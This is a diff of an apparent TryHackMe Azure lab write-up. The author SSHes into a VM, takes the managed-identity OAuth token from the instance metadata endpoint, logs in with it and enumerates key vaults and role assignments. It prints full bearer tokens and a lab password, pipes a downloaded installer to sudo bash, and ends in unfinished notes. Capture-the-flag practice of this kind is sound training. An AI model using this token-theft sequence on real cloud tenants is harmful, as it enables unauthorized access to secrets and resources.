@@ -184,20 +184,247 @@ Good luck!</p>
 <p>4.2. What is the flag?<br>
 <code>__________________________________</code></p>
 
+<p>
+
+- launch a web browser<br>
+- navigate to <strong>https://portal.azure.com</strong>
+- input <strong>Username</code>, and click <strong>Next</strong><br>
+- input <strong>Temporary Access Pass</code>, and click <strong>Sign In</br>
+- select  <strong>Not now</strong> for <strong>Save password on microsoft.com</strong><br>
+- select <strong>No</strong> for <strong>Stay signed in></strong><br>
+- click <code>All resources</code><br>
+- select <code>LinuxVM</code><br>
+- identify <code>rg-11231466</code><br>
+- click <code>Connect</code><br>
+- click <code>Connect</code><br>
+- identify <code>ssh azureuser@40.71.211.25</code><br>
+- remember <code>WhereIsMyMind$#@!</code> on challenge descriprion<br>
+- SSH</p>
+
+<img width="1229" height="567" alt="image" src="https://github.com/user-attachments/assets/c24cb619-1a8b-4a92-9071-e8b4290f979a" />
 
 <br>
 <br>
 <br>
 
+```bash
+:~# ssh azureuser@40.71.211.25
+```
 
-<p>breakglass@tryhackmelabs.onmicrosoft.com : WhereIsMyMind$#@!</p>
+<img width="1192" height="289" alt="image" src="https://github.com/user-attachments/assets/97fc744d-0324-47db-ade0-500d9123d693" />
 
-oz@thmtraininglabs.onmicrosoft.com
+<br>
+<br>
+<br>
 
-oz_thmtraininglabs.onmicrosoft.com#EXT#@tryhackmelabs.onmicrosoft.com
+```bash
+azureuser@LinuxVM:~$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ","client_id":"2707ddbb-db94-44a9-90c5-d4609e5e5f6c","expires_in":"86400","expires_on":"1764020016","ext_expires_in":"86399","not_before":"1763933316","resource":"https://management.azure.com/","token_type":"Bearer"}
+```
 
-qa-breakglass@tryhackmelabs.onmicrosoft.com
-WhereIsMyMind$#@!
------------------
-5&EHc666vsT@c$V&
-----------------
+<p><em>access_tokentoken</em></p>
+
+```bash
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ
+```
+
+```bash
+azureuser@LinuxVM:~$ sudo snap install powershell --classic
+```
+
+```bash
+azureuser@LinuxVM:~$ powershell
+PowerShell 7.5.4
+PS /home/azureuser>
+```
+
+```bash
+PS /home/azureuser>  Install-Module -Name Az -Repository PSGallery -Force
+```
+
+<br>
+<p><em>Connect-AzAccount . syntax</em></p>
+
+```bash
+PS /home/azureuser>  Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
+```
+
+<p><em>Connect-AzAccount . practice</em></p>
+
+```bash
+PS /home/azureuser> Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ -AccountId 2707ddbb-db94-44a9-90c5-d4609e5e5f6c
+
+Subscription name Tenant
+----------------- ------
+Az-Subs-B2C-1     91716a9a-f8ff-490f-8f3a-f2e6da6e1165
+
+PS /home/azureuser> 
+```
+
+
+<img width="1185" height="332" alt="image" src="https://github.com/user-attachments/assets/8e881333-e1e2-424a-9fb1-e140cb00f4df" />
+
+<br>
+<br>
+<br>
+<p>
+
+- akv-11231466<br>
+- rg-11231466</p>
+
+```bash
+PS /home/azureuser> Get-AzResource
+...
+Name              : akv-11231466
+ResourceGroupName : rg-11231466
+ResourceType      : Microsoft.KeyVault/vaults
+Location          : eastus
+ResourceId        : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466/providers/Microsoft.KeyVault/vaults/akv-11231466
+Tags              : 
+```
+
+```bash
+PS /home/azureuser> Get-AzKeyVault -Name akv-11231466 -ResourceGroupName rg-11231466
+```
+
+<img width="1185" height="481" alt="image" src="https://github.com/user-attachments/assets/67619d20-e779-4135-823f-49cf882c077c" />
+
+<br>
+<br>
+<br>
+
+```bash
+PS /home/azureuser> Get-AzKeyVaultSecret -VaultName akv-11231466 -Nam akv-11231466.vault
+Get-AzKeyVaultSecret: Operation returned an invalid status code 'Unauthorized'
+Code: Unauthorized
+Message: AKV10000: Request is missing a Bearer or PoP token.
+```
+
+```bash
+PS /home/azureuser> Get-AzRoleAssignment   
+
+RoleAssignmentName : 1db72df3-57c1-4685-ae2d-b7ef71f09927
+RoleAssignmentId   : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466/providers/Microsoft.Authorization/roleAssignments/1db72df3-57c1-4685
+                     -ae2d-b7ef71f09927
+Scope              : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466
+DisplayName        : 
+SignInName         : 
+RoleDefinitionName : Virtual Machine User Login
+RoleDefinitionId   : fb879df8-f326-4884-b1cf-06f3ad86be52
+ObjectId           : 4bd2b1df-50f0-4c8d-8379-4188bf0a2639
+ObjectType         : User
+CanDelegate        : False
+Description        : 
+ConditionVersion   : 
+Condition          : 
+
+RoleAssignmentName : 8903a05c-e9aa-49d2-ad4a-11c9e5f38f7a
+RoleAssignmentId   : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-11231466/providers/Microsoft.Authorization/roleAssignments/8903a05c-e9aa-49d2
+                     -ad4a-11c9e5f38f7a
+Scope              : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-11231466
+DisplayName        : 
+SignInName         : 
+RoleDefinitionName : Owner
+RoleDefinitionId   : 8e3af657-a8ff-443c-a75c-2fe8c4bcb635
+ObjectId           : a8598b1e-8138-4477-8e72-65717eb35b7f
+ObjectType         : ServicePrincipal
+CanDelegate        : False
+Description        : 
+ConditionVersion   : 
+Condition          : 
+```
+
+<img width="1215" height="520" alt="image" src="https://github.com/user-attachments/assets/600997ba-eab4-47c2-b5b7-7c1c2fd15eab" />
+
+<br>
+<br>
+<br>
+
+```bash
+ /home/azureuser> curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+```
+
+```bash
+ /home/azureuser>az login --identity
+```
+
+```bash
+PS /home/azureuser> Install-Module -Name Az -Repository PSGallery -Force
+```
+
+```bash
+PS /home/azureuser> Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzA3ODgsIm5iZiI6MTc2MzkzMDc4OCwiZXhwIjoxNzY0MDE3NDg4LCJhaW8iOiJBV1FBbS84YUFBQUFZNVZsZCtaT1FUZURkOXBPczRBYnJaZU10bUxETVVNZHNMcVp3RGc3OVBPaGViZGhrYllzZmdBYkYrRnc2REtkYkFHWEFzTnVoT1h1azJEZzNycjBMU0pJQVZycFZLWmhmbENtRW9SVTdGMFRicDJJMjJYKzNURzFKN3Q5QlhzUyIsImFwcGlkIjoiZGQ4NzEzYzYtYzliZC00OTEzLTk0YzctNzJkYWE1NjNmZGFhIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiM2JiYmJhYzgtMDJhNC00MmY4LTg0YjctNWIxZTNmYTlkYmI5IiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiIzYmJiYmFjOC0wMmE0LTQyZjgtODRiNy01YjFlM2ZhOWRiYjkiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJyazdiTk1yV2swLXhXX0hueDdUREFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiTlB3aFN1R1YtWndfRG5mWlpDbVlvcDRGQTRBT2F1NHVlekVzZGJzc3VVTUJkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDE2IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjM1MzQ2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.KrIOYge_NPk21jb8BGbm2NISPf4rKQ0Wvk4mXfcz9gVhB4Vc-Vzc2_lVgI7QV5mDBndy_mDWID7fhxaIHUg13Wpy65jxi7KcqPaveXxQFsHgM3QndrvL59aORrcFnoefyIUc2v6v3fF8X6w6xsCHh2EsellEo3d05Tj_9tPkbCAm6R5DszHpO5rC_6fixQMdFahWnZ7RFG1q6nUeseA6cDxoMVBkuRs0rLMvtEE8c2exT5KnBRmmaOtFRqOBQ5aGCgbbOvhVPr6iUhPDRikuDrgtUCpnbXfZmYjB2A18o_6U5l2FgPbfIBNiq98MWBTgsQlzSb4PXCtEyQsBOSwPHA -AccountId dd8713c6-c9bd-4913-94c7-72daa563fdaa
+
+Subscription name Tenant
+----------------- ------
+                  91716a9a-f8ff-490f-8f3a-f2e6da6e1165
+```
+
+
+
+Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzA3ODgsIm5iZiI6MTc2MzkzMDc4OCwiZXhwIjoxNzY0MDE3NDg4LCJhaW8iOiJBV1FBbS84YUFBQUFZNVZsZCtaT1FUZURkOXBPczRBYnJaZU10bUxETVVNZHNMcVp3RGc3OVBPaGViZGhrYllzZmdBYkYrRnc2REtkYkFHWEFzTnVoT1h1azJEZzNycjBMU0pJQVZycFZLWmhmbENtRW9SVTdGMFRicDJJMjJYKzNURzFKN3Q5QlhzUyIsImFwcGlkIjoiZGQ4NzEzYzYtYzliZC00OTEzLTk0YzctNzJkYWE1NjNmZGFhIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiM2JiYmJhYzgtMDJhNC00MmY4LTg0YjctNWIxZTNmYTlkYmI5IiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiIzYmJiYmFjOC0wMmE0LTQyZjgtODRiNy01YjFlM2ZhOWRiYjkiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJyazdiTk1yV2swLXhXX0hueDdUREFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiTlB3aFN1R1YtWndfRG5mWlpDbVlvcDRGQTRBT2F1NHVlekVzZGJzc3VVTUJkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDE2IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjM1MzQ2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.KrIOYge_NPk21jb8BGbm2NISPf4rKQ0Wvk4mXfcz9gVhB4Vc-Vzc2_lVgI7QV5mDBndy_mDWID7fhxaIHUg13Wpy65jxi7KcqPaveXxQFsHgM3QndrvL59aORrcFnoefyIUc2v6v3fF8X6w6xsCHh2EsellEo3d05Tj_9tPkbCAm6R5DszHpO5rC_6fixQMdFahWnZ7RFG1q6nUeseA6cDxoMVBkuRs0rLMvtEE8c2exT5KnBRmmaOtFRqOBQ5aGCgbbOvhVPr6iUhPDRikuDrgtUCpnbXfZmYjB2A18o_6U5l2FgPbfIBNiq98MWBTgsQlzSb4PXCtEyQsBOSwPHA -AccountId -AccountId fcfe35ec-a04b-4f48-98a1-5a90d8f7d14f
+```
+
+PS /tmp> Get-AzResource
+
+...
+Name              : akv-11236982
+ResourceGroupName : rg-11236982
+ResourceType      : Microsoft.KeyVault/vaults
+Location          : eastus
+ResourceId        : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11236982/providers/Microsoft.KeyVault/vaults/akv-11236982
+Tags              : 
+
+
+PS /tmp> Get-AzKeyVault -Name akv-11236982 -ResourceGroupName rg-11236982 
+
+<img width="1220" height="444" alt="image" src="https://github.com/user-attachments/assets/e18e17c1-b6c1-4aae-b671-1b42f51bffc8" />
+
+
+
+PS /tmp> Get-AzRoleAssignment  
+
+<img width="1217" height="497" alt="image" src="https://github.com/user-attachments/assets/f440f80b-e35f-4f0f-a921-59f25c2d0b69" />
+
+
+curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+
+
+
+az login --identity
+
+
+az keyvault show --name akv-11236982 --resource-group rg-11236982
+
+
+
+enableRbacAuthorization": true??????
+
+
+az vm identity show --name LinuxVM --resource-group rg-11236982 --query principalId --output tsv
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
